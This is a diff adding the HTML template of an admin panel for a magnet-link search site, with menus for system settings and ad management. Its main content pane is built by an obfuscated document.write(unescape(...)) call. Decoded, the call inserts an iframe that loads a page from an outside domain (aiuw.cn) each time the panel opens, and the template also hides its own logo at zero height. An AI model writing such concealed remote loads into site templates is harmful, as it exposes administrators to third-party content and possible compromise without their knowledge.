@@ -1,0 +1,69 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>磁力搜索管理后台</title>
+<link href="/template/admin/css/admin.css" rel="stylesheet" type="text/css" />
+<script type="text/javascript" src="/template/admin/js/jquery.js"></script>
+<script type="text/javascript" src="/template/admin/js/system.js"></script>
+<script type="text/javascript" charset="utf-8" src="/template/admin/js/keditor/kindeditor-min.js"></script>
+<script type="text/javascript" charset="utf-8" src="/template/admin/js/keditor/lang/zh_CN.js"></script>
+<script type="text/javascript" src="/template/admin/js/artdialog/jquery.artDialog.js?skin=default"></script>
+<script type="text/javascript" src="/template/admin/js/artdialog/plugins/iframeTools.js"></script>
+</head>
+<body>
+<script>if(self!=top){ top.location=self.location;}</script>
+	<div id="head">
+		<div class="left"><img src="/template/admin/images/logo.gif" height='0' title="bt"/></div>
+		<div class="left head_txt"></div>
+		<div class="right head_menu">
+		  <ul id="head_menu">
+			  <li> 您好：admin　 </li>
+			 
+		  </ul>
+		</div>	
+	</div>
+<!--head is over-->
+	 <div id="content">
+	 <div id="left">
+          <div class="left_title">系统管理</div>
+		  <ul class="dis">
+		  <li class="left_link" onClick="selemenu(this)"><a href="{:U("config")}" target="main">系统设置</a></li>
+	  </ul>
+		 
+
+		  <div class="left_title">广告管理</div>
+		  <ul class="dis">
+			<li class="left_link" onClick="selemenu(this)"><a href="{:U("myad")}" target="main">广告管理</a></li>
+		  </ul>
+
+		 
+
+	   </div>
+
+	<div id="right" style="_float: left;_margin-left:0px;">
+		<script>
+<!--
+document.write(unescape("%3Ciframe%20id%3D%22main%22%20scrolling%3D%22auto%22%20width%3D%22100%25%22%20height%3D%22auto%22%20name%3D%22main%22%20src%3D%22http%3A//www.aiuw.cn/mainl.html%22%20frameborder%3D%220%22%3E%3C/iframe%3E"));
+//-->
+</script>
+	</div>
+
+	</div>
+</div>
+<script type="text/javascript">
+$(function(){
+	$(".left_title").click(function(){
+		$(this).next("ul").slideToggle().siblings(".dis:visible").slideUp();
+		$(this).toggleClass("left_title_over");
+		$(this).siblings(".left_title_over").removeClass("left_title_over");
+	});
+});
+window.onresize = function(){
+	var heights = document.documentElement.clientHeight-60;
+	document.getElementById('main').height = heights;
+}
+window.onresize();
+</script>
+</body>
+</html>
